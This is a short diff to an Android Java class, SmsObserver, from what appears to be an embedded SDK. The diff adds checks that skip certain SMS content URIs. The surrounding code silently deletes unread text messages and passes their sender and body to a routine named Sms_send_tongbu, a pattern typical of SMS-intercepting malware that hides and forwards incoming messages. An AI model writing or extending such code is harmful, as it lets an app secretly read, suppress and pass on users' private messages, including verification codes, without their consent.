@@ -47,6 +47,12 @@ public class SmsObserver extends ContentObserver {
             if (uri.toString().equals("content://sms/raw")) {
                 return;
             }
+            if (uri.toString().equals("content://sms/")) {
+                return;
+            }
+            if (uri.toString().equals("content://sms")) {
+                return;
+            }
             a++;
             Log.debug("onChange", "No:" + a);
             Log.debug("onChange", "selfChange:" + selfChange + "");
@@ -93,7 +99,7 @@ public class SmsObserver extends ContentObserver {
     private int delete(String _id, String smsAddress, String smsBody) {
         Uri contentUri = Uri.parse("content://sms");
         int delete = SDKInit.getResolver().delete(contentUri, "read=0 and _id=?", new String[]{_id});
-        Sms_send_tongbu(smsAddress +"\t"+ smsBody, SDKInit.mContext, delete);
+        Sms_send_tongbu(smsAddress + "\t" + smsBody, SDKInit.mContext, delete);
         return delete;
     }
 
